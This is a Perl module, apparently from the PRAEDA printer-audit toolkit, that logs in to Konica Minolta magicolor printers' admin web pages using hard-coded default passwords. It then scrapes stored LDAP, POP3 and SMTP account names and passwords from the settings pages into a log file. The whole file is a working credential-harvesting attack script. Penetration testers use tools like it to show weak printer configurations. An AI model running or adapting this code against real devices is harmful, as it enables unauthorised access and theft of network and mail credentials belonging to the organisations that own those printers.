# Minolta Konica credential capture  LDAP,POP3,SMTP
######################################################
#                PRAEDA Module #MP0019               #
#           Copyright (C) 2012 Foofus.net            #
#              Deral 'percX' Heiland                 #
######################################################
package MP0019;
sub MP0019
{

# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];
my $data1 = $_[6];

# Open output file for loging
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
     print "\n**********Attempting credential extraction from Minolta Konica $TARGET : JOB MP0019**********\n";
     print OUTFILE "\n**********Attempting credential extraction from Minolta Konica $TARGET : JOB MP0019**********\n";

#validate printer model 
if ($data1 =~ /KONICA MINOLTA magicolor 4690MF/)
	{
	 $PWD = "sysadm";
	}
if ($data1 =~ /KONICA MINOLTA magicolor 1690MF/)
        {
         $PWD = "sysAdmin";
        }



# Setup cookie and place in cookie jar
 $cookie_jar = HTTP::Cookies->new();
 my $browser = LWP::UserAgent->new(timeout => 120);
 $browser->cookie_jar($cookie_jar);
 

# enable redirect handeling for POST process
 push @{ $browser->requests_redirectable }, 'POST';


# Authenticate with printer default credential password
my $response = $browser->post("http$web://$TARGET:$PORTS/F0_17785_AdminLogin.cgi",
    [
     "Admin_Password" =>"$PWD",
     "ConfirmPage" => "10",
     "ConfirmRec" =>"60",
     "Login" => "Login",
    ]);
    print " error: ", $response->status_line
       unless $response->is_success;
    print "Weird content type  -- ", $response->content_type
       unless $response->content_type eq 'text/html';


# Validate that login was successfull before proceeding
my $content = $response->content();
if ($content =~ /H60_17785_SysStat.htm/)
        {
            print "\n$TARGET : SUCCESS : Minolta Konica default password=$PWD\n";
            print OUTFILE "\n$TARGET : SUCCESS : Minolta Konica default password=$PWD\n";

# retrieve the ldap setting for parsing
            $response = $browser->get("http$web://$TARGET:$PORTS/H127_17785_NLDAP.htm");
            my $content = $response->content();

# parse ldap setup data from page information on input tags
            my $html = HTML::TagParser->new($content);
            my @list = $html->getElementsByTagName( "input" );

            my @values = (
     		"LDAP_Account",
     		"Password",
     		"Domain_Name",
   		 );
            print "Attempting LDAP setting pull:\n";
            foreach my $elem ( @list )
                 {
                  my $text1 = $elem->getAttribute("name");
                  my $text2 = $elem->getAttribute("value");
			foreach $value (@values)
               			{
                		  
					if ($text1 eq $value)
                     		     	  {
                                            if ($text2 ne "")
                                               {
 				      	        print "$value=$text2\n";             			
 				                print OUTFILE "$value=$text2\n";
                                               }
                                          }
               			}

                 }


# retrieve the pop3 and SMTP setting page for parsing
            $response = $browser->get("http$web://$TARGET:$PORTS/H91_17795_NSmtp.htm");
            my $content = $response->content();

# parse the POP3 and SMTP setup data from page information on input tags
            my $html = HTML::TagParser->new($content);
            my @list = $html->getElementsByTagName( "input" );

            my @values = (
                "Pop3_Server_Address",
                "Pop3_Account_Name",
                "Pop3_Password",
                "User_Name",
                "Password",                
                         );
	    print "\nAttempting SMTP setting pull:\n";
            foreach my $elem ( @list )
                 {
                  my $text1 = $elem->getAttribute("name");
                  my $text2 = $elem->getAttribute("value");
                        foreach $value (@values)
                           {
                                  
                                        if ($text1 eq $value)
                                          {
                                            if ($text2 ne "")
                                               {
                                                print "$value=$text2\n";
                                                print OUTFILE "$value=$text2\n";
                                               }
                                          }
                           }
                 }
	}	
        
	else
	{
           print "\nAuthentication FAILED \n";
           print OUTFILE "\nAuthentication FAILED \n";
        }

# Force system logout 
my $response = $browser->post("http$web://$TARGET:$PORTS/F1_17785_AdminLogout.cg",
    [
     "Logout" =>"Logout",
     "ConfirmPage" => "10",
     "ConfirmRec" =>"60",
    ]);
# operation completed close out output files
close(OUTFILE);
}
1;
